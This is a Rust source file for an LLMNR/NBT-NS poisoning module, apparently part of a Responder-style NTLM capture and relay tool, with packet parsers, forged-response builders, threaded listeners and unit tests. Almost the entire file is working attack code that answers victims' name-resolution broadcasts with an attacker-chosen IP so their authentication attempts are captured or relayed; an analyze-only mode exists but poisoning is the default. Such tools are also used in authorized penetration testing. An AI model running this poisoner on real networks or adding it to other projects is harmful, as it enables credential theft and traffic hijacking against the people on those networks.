//! LLMNR/NBT-NS/mDNS Poisoner Module
//!
//! Poisons multicast name resolution protocols to capture
//! authentication attempts and redirect traffic.
//!
//! # Protocols
//! - LLMNR: UDP 5355, multicast 224.0.0.252
//! - NBT-NS: UDP 137/138, broadcast
//! - mDNS: UDP 5353, multicast 224.0.0.251

use crate::{AttackMode, RelayError, Result};
use std::net::{Ipv4Addr, UdpSocket};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;
use std::time::Duration;
use tracing::{debug, error, info, warn};

// ═══════════════════════════════════════════════════════════
// Protocol Constants
// ═══════════════════════════════════════════════════════════

/// LLMNR multicast address
pub const LLMNR_MULTICAST: Ipv4Addr = Ipv4Addr::new(224, 0, 0, 252);
/// LLMNR port
pub const LLMNR_PORT: u16 = 5355;

/// NBT-NS broadcast address
pub const NBTNS_BROADCAST: Ipv4Addr = Ipv4Addr::new(255, 255, 255, 255);
/// NBT-NS name service port
pub const NBTNS_PORT: u16 = 137;
/// NBT-NS datagram port
pub const NBTNS_DGRAM_PORT: u16 = 138;

/// mDNS multicast address
pub const MDNS_MULTICAST: Ipv4Addr = Ipv4Addr::new(224, 0, 0, 251);
/// mDNS port
pub const MDNS_PORT: u16 = 5353;

// ═══════════════════════════════════════════════════════════
// Packet Structures
// ═══════════════════════════════════════════════════════════

/// LLMNR packet header
#[derive(Debug, Clone)]
pub struct LlmnrHeader {
    pub transaction_id: u16,
    pub flags: u16,
    pub questions: u16,
    pub answers: u16,
    pub authority: u16,
    pub additional: u16,
}

impl LlmnrHeader {
    /// Parse from bytes
    pub fn parse(data: &[u8]) -> Option<Self> {
        if data.len() < 12 {
            return None;
        }
        Some(Self {
            transaction_id: u16::from_be_bytes([data[0], data[1]]),
            flags: u16::from_be_bytes([data[2], data[3]]),
            questions: u16::from_be_bytes([data[4], data[5]]),
            answers: u16::from_be_bytes([data[6], data[7]]),
            authority: u16::from_be_bytes([data[8], data[9]]),
            additional: u16::from_be_bytes([data[10], data[11]]),
        })
    }

    /// Check if this is a query
    pub fn is_query(&self) -> bool {
        (self.flags & 0xF800) == 0x0000 // QR=0, OPCODE=0
    }

    /// Create response header
    pub fn response(&self) -> Self {
        Self {
            transaction_id: self.transaction_id,
            flags: self.flags | 0x8000, // Set QR=1 (response)
            questions: self.questions,
            answers: 1,
            authority: 0,
            additional: 0,
        }
    }

    /// Serialize to bytes
    pub fn to_bytes(&self) -> [u8; 12] {
        let mut buf = [0u8; 12];
        buf[0..2].copy_from_slice(&self.transaction_id.to_be_bytes());
        buf[2..4].copy_from_slice(&self.flags.to_be_bytes());
        buf[4..6].copy_from_slice(&self.questions.to_be_bytes());
        buf[6..8].copy_from_slice(&self.answers.to_be_bytes());
        buf[8..10].copy_from_slice(&self.authority.to_be_bytes());
        buf[10..12].copy_from_slice(&self.additional.to_be_bytes());
        buf
    }
}

/// NBT-NS packet types
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum NbnsNodeType {
    Workstation = 0x00,
    NameServer = 0x02,
    DomainController = 0x1C,
}

/// Parse NBT-NS name from query
pub fn parse_nbns_name(data: &[u8]) -> Option<String> {
    if data.len() < 33 || data[0] as usize > data.len() - 1 {
        return None;
    }

    let name_len = data[0] as usize;
    if name_len != 32 {
        return None; // NetBIOS names are always 32 bytes encoded
    }

    // Decode the NetBIOS name (each byte represents two hex nibbles)
    let encoded = &data[1..=32];
    let mut decoded = String::new();

    for chunk in encoded.chunks(2) {
        if chunk.len() == 2 {
            // NBT-NS level-1 encoding uses only 'A'..'P' (nibble 0..=0xF + 'A')
            // Bytes outside this range indicate a malformed/crafted packet —
            // return None instead of panicking on the subtraction.
            if chunk[0] < b'A' || chunk[0] > b'P' || chunk[1] < b'A' || chunk[1] > b'P' {
                return None;
            }
            let high = (chunk[0] - b'A') << 4;
            let low = chunk[1] - b'A';
            let byte = high | low;
            if byte != 0 {
                decoded.push(byte as char);
            }
        }
    }

    Some(decoded.trim_end().to_string())
}

/// Encode a name for NBT-NS
pub fn encode_nbns_name(name: &str) -> Vec<u8> {
    let name = format!("{:<15}", name); // Pad to 15 chars
    let name = format!("{}{}", name, { ' ' }); // Add type byte (space = workstation)

    let mut encoded = Vec::with_capacity(34);
    encoded.push(32); // Length byte

    for byte in name.bytes().take(16) {
        let high = (byte >> 4) + b'A';
        let low = (byte & 0x0F) + b'A';
        encoded.push(high);
        encoded.push(low);
    }

    encoded.push(0); // Terminator
    encoded
}

// ═══════════════════════════════════════════════════════════
// Poisoner Configuration
// ═══════════════════════════════════════════════════════════

/// Poisoner configuration
#[derive(Debug, Clone)]
pub struct PoisonerConfig {
    /// IP to listen on
    pub listen_ip: String,
    /// IP to respond with in poisoned answers
    pub poison_ip: String,
    /// Attack mode (capture vs relay)
    pub attack_mode: AttackMode,
    /// Connection timeout in seconds
    pub timeout: u64,
    /// Enable LLMNR poisoning
    pub llmnr: bool,
    /// Enable NBT-NS poisoning
    pub nbtns: bool,
    /// Enable mDNS poisoning
    pub mdns: bool,
    /// Analyze mode (don't poison, just log queries)
    pub analyze_only: bool,
    /// Target hostnames to poison (empty = all)
    pub target_hosts: Vec<String>,
}

impl Default for PoisonerConfig {
    fn default() -> Self {
        Self {
            listen_ip: "0.0.0.0".to_string(),
            poison_ip: "0.0.0.0".to_string(),
            attack_mode: AttackMode::Capture,
            timeout: 30,
            llmnr: true,
            nbtns: true,
            mdns: false,
            analyze_only: false,
            target_hosts: Vec::new(),
        }
    }
}

/// Captured query information
#[derive(Debug, Clone)]
pub struct CapturedQuery {
    pub protocol: String,
    pub source_ip: String,
    pub source_port: u16,
    pub query_name: String,
    pub query_type: String,
    pub timestamp: u64,
}

// ═══════════════════════════════════════════════════════════
// Poisoner Implementation
// ═══════════════════════════════════════════════════════════

/// LLMNR/NBT-NS/mDNS Poisoner
pub struct Poisoner {
    config: PoisonerConfig,
    running: Arc<AtomicBool>,
    captured_queries: Arc<std::sync::Mutex<Vec<CapturedQuery>>>,
    threads: Vec<thread::JoinHandle<()>>,
}

impl Poisoner {
    /// Create a new poisoner with the given configuration
    pub fn new(config: PoisonerConfig) -> Result<Self> {
        // Validate poison IP
        if config.poison_ip.parse::<Ipv4Addr>().is_err() {
            return Err(
                RelayError::Config(format!("Invalid poison IP: {}", config.poison_ip)).into(),
            );
        }

        Ok(Self {
            config,
            running: Arc::new(AtomicBool::new(false)),
            captured_queries: Arc::new(std::sync::Mutex::new(Vec::new())),
            threads: Vec::new(),
        })
    }

    /// Start the poisoner
    pub async fn start(&mut self) -> Result<()> {
        if self.running.load(Ordering::SeqCst) {
            return Err(RelayError::Config("Poisoner already running".to_string()).into());
        }

        info!(
            "Starting poisoner on {} -> {}",
            self.config.listen_ip, self.config.poison_ip
        );

        self.running.store(true, Ordering::SeqCst);

        // Start LLMNR listener
        if self.config.llmnr {
            let running = Arc::clone(&self.running);
            let listen_ip = self.config.listen_ip.clone();
            let poison_ip = self.config.poison_ip.clone();
            let analyze_only = self.config.analyze_only;
            let target_hosts = self.config.target_hosts.clone();
            let captured = Arc::clone(&self.captured_queries);

            let handle = thread::spawn(move || {
                if let Err(e) = Self::run_llmnr_listener(
                    running,
                    &listen_ip,
                    &poison_ip,
                    analyze_only,
                    &target_hosts,
                    captured,
                ) {
                    error!("LLMNR listener error: {}", e);
                }
            });
            self.threads.push(handle);
        }

        // Start NBT-NS listener
        if self.config.nbtns {
            let running = Arc::clone(&self.running);
            let listen_ip = self.config.listen_ip.clone();
            let poison_ip = self.config.poison_ip.clone();
            let analyze_only = self.config.analyze_only;
            let target_hosts = self.config.target_hosts.clone();
            let captured = Arc::clone(&self.captured_queries);

            let handle = thread::spawn(move || {
                if let Err(e) = Self::run_nbtns_listener(
                    running,
                    &listen_ip,
                    &poison_ip,
                    analyze_only,
                    &target_hosts,
                    captured,
                ) {
                    error!("NBT-NS listener error: {}", e);
                }
            });
            self.threads.push(handle);
        }

        info!("Poisoner started successfully");
        Ok(())
    }

    /// Stop the poisoner
    pub async fn stop(&mut self) -> Result<()> {
        if !self.running.load(Ordering::SeqCst) {
            return Ok(());
        }

        info!("Stopping poisoner");
        self.running.store(false, Ordering::SeqCst);

        // Wait for threads to finish
        for handle in self.threads.drain(..) {
            let _ = handle.join();
        }

        info!("Poisoner stopped");
        Ok(())
    }

    /// Check if poisoner is running
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }

    /// Get configuration
    pub fn config(&self) -> &PoisonerConfig {
        &self.config
    }

    /// Get captured queries
    pub fn get_captured_queries(&self) -> Vec<CapturedQuery> {
        self.captured_queries.lock().unwrap().clone()
    }

    // ═══════════════════════════════════════════════════════
    // LLMNR Listener
    // ═══════════════════════════════════════════════════════

    fn run_llmnr_listener(
        running: Arc<AtomicBool>,
        listen_ip: &str,
        poison_ip: &str,
        analyze_only: bool,
        target_hosts: &[String],
        captured: Arc<std::sync::Mutex<Vec<CapturedQuery>>>,
    ) -> Result<()> {
        // Bind to LLMNR port
        let socket = UdpSocket::bind(format!("{}:{}", listen_ip, LLMNR_PORT))
            .map_err(|e| RelayError::Socket(format!("Failed to bind LLMNR socket: {}", e)))?;

        // Join multicast group
        let multicast: Ipv4Addr = LLMNR_MULTICAST;
        let local: Ipv4Addr = listen_ip.parse().unwrap_or(Ipv4Addr::UNSPECIFIED);

        socket
            .join_multicast_v4(&multicast, &local)
            .map_err(|e| RelayError::Socket(format!("Failed to join LLMNR multicast: {}", e)))?;

        socket
            .set_read_timeout(Some(Duration::from_millis(100)))
            .ok();

        info!("LLMNR listener started on {}:{}", listen_ip, LLMNR_PORT);

        let mut buf = [0u8; 65535];

        while running.load(Ordering::SeqCst) {
            match socket.recv_from(&mut buf) {
                Ok((len, src)) => {
                    if let Some(query_name) = Self::parse_llmnr_query(&buf[..len]) {
                        debug!("LLMNR query for '{}' from {}", query_name, src);

                        // Record captured query
                        {
                            let mut cap = captured.lock().unwrap();
                            cap.push(CapturedQuery {
                                protocol: "LLMNR".to_string(),
                                source_ip: src.ip().to_string(),
                                source_port: src.port(),
                                query_name: query_name.clone(),
                                query_type: "A".to_string(),
                                timestamp: std::time::SystemTime::now()
                                    .duration_since(std::time::UNIX_EPOCH)
                                    .unwrap()
                                    .as_secs(),
                            });
                        }

                        // Check if we should poison this query
                        let should_poison = target_hosts.is_empty()
                            || target_hosts
                                .iter()
                                .any(|t| query_name.to_lowercase().contains(&t.to_lowercase()));

                        if should_poison && !analyze_only {
                            // Send poisoned response
                            if let Ok(response) = Self::build_llmnr_response(&buf[..len], poison_ip)
                            {
                                if let Err(e) = socket.send_to(&response, src) {
                                    warn!("Failed to send LLMNR response: {}", e);
                                } else {
                                    info!(
                                        "Poisoned LLMNR response for '{}' -> {}",
                                        query_name, poison_ip
                                    );
                                }
                            }
                        }
                    }
                }
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => continue,
                Err(e) => {
                    warn!("LLMNR recv error: {}", e);
                }
            }
        }

        info!("LLMNR listener stopped");
        Ok(())
    }

    /// Parse LLMNR query to extract the queried name
    fn parse_llmnr_query(data: &[u8]) -> Option<String> {
        if data.len() < 12 {
            return None;
        }

        let header = LlmnrHeader::parse(data)?;
        if !header.is_query() {
            return None;
        }

        // Parse question section
        let mut offset = 12;
        let mut name_parts = Vec::new();

        while offset < data.len() {
            let label_len = data[offset] as usize;
            if label_len == 0 {
                break;
            }
            offset += 1;
            if offset + label_len > data.len() {
                break;
            }
            let label = String::from_utf8_lossy(&data[offset..offset + label_len]);
            name_parts.push(label.to_string());
            offset += label_len;
        }

        if name_parts.is_empty() {
            None
        } else {
            Some(name_parts.join("."))
        }
    }

    /// Build LLMNR response with poisoned IP
    fn build_llmnr_response(query: &[u8], poison_ip: &str) -> Result<Vec<u8>> {
        let header = LlmnrHeader::parse(query)
            .ok_or_else(|| RelayError::Protocol("Invalid LLMNR query".to_string()))?;

        let mut response = Vec::new();

        // Response header
        response.extend_from_slice(&header.response().to_bytes());

        // Copy question section from query
        let question_start = 12;
        let mut question_end = question_start;
        while question_end < query.len() {
            if query[question_end] == 0 {
                question_end += 5; // null terminator + type(2) + class(2)
                break;
            }
            question_end += 1 + query[question_end] as usize;
        }

        if question_end > query.len() {
            return Err(RelayError::Protocol("Invalid question section".to_string()).into());
        }

        response.extend_from_slice(&query[question_start..question_end]);

        // Build answer section
        // Name pointer (compression) pointing to question
        response.push(0xC0); // Compression pointer
        response.push(0x0C); // Offset to question name

        // Type A (IPv4)
        response.extend_from_slice(&1u16.to_be_bytes());
        // Class IN
        response.extend_from_slice(&1u16.to_be_bytes());
        // TTL (1 second for quick cache expiry)
        response.extend_from_slice(&1u32.to_be_bytes());
        // RDLENGTH
        response.extend_from_slice(&4u16.to_be_bytes());
        // RDATA (IPv4 address)
        let ip: Ipv4Addr = poison_ip
            .parse()
            .map_err(|_| RelayError::Config(format!("Invalid poison IP: {}", poison_ip)))?;
        response.extend_from_slice(&ip.octets());

        Ok(response)
    }

    // ═══════════════════════════════════════════════════════
    // NBT-NS Listener
    // ═══════════════════════════════════════════════════════

    fn run_nbtns_listener(
        running: Arc<AtomicBool>,
        listen_ip: &str,
        poison_ip: &str,
        analyze_only: bool,
        target_hosts: &[String],
        captured: Arc<std::sync::Mutex<Vec<CapturedQuery>>>,
    ) -> Result<()> {
        // Create UDP socket for NBT-NS
        let socket = UdpSocket::bind(format!("{}:{}", listen_ip, NBTNS_PORT))
            .map_err(|e| RelayError::Socket(format!("Failed to bind NBT-NS socket: {}", e)))?;

        socket
            .set_broadcast(true)
            .map_err(|e| RelayError::Socket(format!("Failed to enable broadcast: {}", e)))?;

        socket
            .set_read_timeout(Some(Duration::from_millis(100)))
            .ok();

        info!("NBT-NS listener started on {}:{}", listen_ip, NBTNS_PORT);

        let mut buf = [0u8; 65535];

        while running.load(Ordering::SeqCst) {
            match socket.recv_from(&mut buf) {
                Ok((len, src)) => {
                    // Parse NBT-NS query
                    if let Some(query_name) = parse_nbns_name(&buf[13..]) {
                        debug!("NBT-NS query for '{}' from {}", query_name, src);

                        // Record captured query
                        {
                            let mut cap = captured.lock().unwrap();
                            cap.push(CapturedQuery {
                                protocol: "NBT-NS".to_string(),
                                source_ip: src.ip().to_string(),
                                source_port: src.port(),
                                query_name: query_name.clone(),
                                query_type: "NB".to_string(),
                                timestamp: std::time::SystemTime::now()
                                    .duration_since(std::time::UNIX_EPOCH)
                                    .unwrap()
                                    .as_secs(),
                            });
                        }

                        // Check if we should poison
                        let should_poison = target_hosts.is_empty()
                            || target_hosts
                                .iter()
                                .any(|t| query_name.to_lowercase().contains(&t.to_lowercase()));

                        if should_poison && !analyze_only {
                            // Send poisoned response
                            if let Ok(response) = Self::build_nbtns_response(&buf[..len], poison_ip)
                            {
                                if let Err(e) = socket.send_to(&response, src) {
                                    warn!("Failed to send NBT-NS response: {}", e);
                                } else {
                                    info!(
                                        "Poisoned NBT-NS response for '{}' -> {}",
                                        query_name, poison_ip
                                    );
                                }
                            }
                        }
                    }
                }
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => continue,
                Err(e) => {
                    warn!("NBT-NS recv error: {}", e);
                }
            }
        }

        info!("NBT-NS listener stopped");
        Ok(())
    }

    /// Build NBT-NS response with poisoned IP
    fn build_nbtns_response(query: &[u8], poison_ip: &str) -> Result<Vec<u8>> {
        if query.len() < 14 {
            return Err(RelayError::Protocol("NBT-NS query too short".to_string()).into());
        }

        let mut response = Vec::new();

        // Transaction ID (copy from query)
        response.extend_from_slice(&query[0..2]);

        // Flags: response, authoritative answer
        response.extend_from_slice(&0x8500u16.to_be_bytes());

        // Questions: 1
        response.extend_from_slice(&1u16.to_be_bytes());
        // Answers: 1
        response.extend_from_slice(&1u16.to_be_bytes());
        // Authority: 0
        response.extend_from_slice(&0u16.to_be_bytes());
        // Additional: 0
        response.extend_from_slice(&0u16.to_be_bytes());

        // Copy question name from query
        let name_end = 14 + 32 + 2; // Header + encoded name + null + suffix
        if name_end > query.len() {
            return Err(RelayError::Protocol("Invalid NBT-NS query format".to_string()).into());
        }
        response.extend_from_slice(&query[12..name_end]);

        // Question type and class
        response.extend_from_slice(&query[name_end..name_end + 4]);

        // Answer section
        // Name pointer to question
        response.push(0xC0);
        response.push(0x0C);

        // Type NB (NetBIOS)
        response.extend_from_slice(&0x0020u16.to_be_bytes());
        // Class IN
        response.extend_from_slice(&1u16.to_be_bytes());
        // TTL
        response.extend_from_slice(&0x000493E0u32.to_be_bytes()); // ~5 minutes
        // RDLENGTH
        response.extend_from_slice(&6u16.to_be_bytes());
        // Flags (group name, B-node)
        response.extend_from_slice(&0x0000u16.to_be_bytes());
        // IP address
        let ip: Ipv4Addr = poison_ip
            .parse()
            .map_err(|_| RelayError::Config(format!("Invalid poison IP: {}", poison_ip)))?;
        response.extend_from_slice(&ip.octets());

        Ok(response)
    }
}

impl Drop for Poisoner {
    fn drop(&mut self) {
        self.running.store(false, Ordering::SeqCst);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_poisoner_config_default() {
        let config = PoisonerConfig::default();
        assert_eq!(config.listen_ip, "0.0.0.0");
        assert!(config.llmnr);
        assert!(config.nbtns);
        assert!(!config.mdns);
        assert!(!config.analyze_only);
    }

    #[test]
    fn test_llmnr_header() {
        let query = [
            0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ];
        let header = LlmnrHeader::parse(&query).unwrap();
        assert!(header.is_query());
        assert_eq!(header.transaction_id, 1);
        assert_eq!(header.questions, 1);

        let response = header.response();
        assert!(!response.is_query());
        assert_eq!(response.answers, 1);
    }

    #[test]
    fn test_nbns_name_encoding() {
        let encoded = encode_nbns_name("WPAD");
        assert!(!encoded.is_empty());

        // First byte should be length (32)
        assert_eq!(encoded[0], 32);
    }

    #[test]
    fn test_llmnr_query_parsing() {
        // Minimal LLMNR query for "test.local"
        let query = [
            0x00, 0x01, // Transaction ID
            0x00, 0x00, // Flags (query)
            0x00, 0x01, // Questions
            0x00, 0x00, // Answers
            0x00, 0x00, // Authority
            0x00, 0x00, // Additional
            0x04, b't', b'e', b's', b't', // "test" label
            0x05, b'l', b'o', b'c', b'a', b'l', // "local" label
            0x00, // End of name
            0x00, 0x01, // Type A
            0x00, 0x01, // Class IN
        ];

        let name = Poisoner::parse_llmnr_query(&query).unwrap();
        assert_eq!(name, "test.local");
    }

    #[test]
    fn test_build_llmnr_response() {
        let query = [
            0x00, 0x01, // Transaction ID
            0x00, 0x00, // Flags (query)
            0x00, 0x01, // Questions
            0x00, 0x00, // Answers
            0x00, 0x00, // Authority
            0x00, 0x00, // Additional
            0x04, b't', b'e', b's', b't', 0x00, // End of name
            0x00, 0x01, // Type A
            0x00, 0x01, // Class IN
        ];

        let response = Poisoner::build_llmnr_response(&query, "192.168.1.100").unwrap();

        // Check transaction ID copied
        assert_eq!(response[0..2], [0x00, 0x01]);
        // Check QR flag set (response)
        assert_eq!(response[2] & 0x80, 0x80);
    }

    #[tokio::test]
    async fn test_poisoner_lifecycle() {
        let config = PoisonerConfig {
            listen_ip: "0.0.0.0".to_string(),
            poison_ip: "192.168.1.100".to_string(),
            attack_mode: AttackMode::Capture,
            timeout: 30,
            llmnr: true,
            nbtns: true,
            mdns: false,
            analyze_only: true, // Don't poison in test
            target_hosts: Vec::new(),
        };

        let mut poisoner = Poisoner::new(config).unwrap();
        assert!(!poisoner.is_running());

        poisoner.start().await.unwrap();
        assert!(poisoner.is_running());

        // Let it run briefly
        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;

        poisoner.stop().await.unwrap();
        assert!(!poisoner.is_running());
    }
}
